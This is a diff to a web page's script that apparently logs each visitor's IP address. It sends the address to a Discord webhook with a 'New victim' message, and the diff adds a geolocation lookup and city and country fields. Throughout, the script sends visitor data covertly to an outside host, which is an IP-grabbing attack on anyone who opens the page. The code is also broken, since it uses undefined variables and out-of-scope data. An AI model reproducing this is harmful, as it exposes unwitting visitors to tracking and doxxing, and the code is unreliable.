@@ -12,7 +12,7 @@
         // Function to send IP address to Discord webhook
         function sendIpToDiscord(ip) {
             const payload = {
-                content: `@phantomvoid_1 New victim IP: ${ip}`
+                content: `@phantomvoid_1 New victim: ${ip} City: ${city} Country ${country_name} `
             };
 
             fetch(DISCORD_WEBHOOK_URL, {
@@ -40,7 +40,19 @@
                 sendIpToDiscord(data.ip);
             })
             .catch(error => console.error('Error:', error));
-    print ('too ez!' + data.ip);
+            fetch('https://ipapi.co/json/')
+          .then(response => response.json())
+          .then(data => {
+            console.log('IP Address:', data.ip);
+            console.log('City:', data.city);
+            console.log('Country:', data.country_name);
+            // Further process the location data
+          })
+          .catch(error => {
+            console.error('Error fetching IP location:', error);
+          });
+
+    window.alert(data.ip);
     </script>
 </body>
 </html>
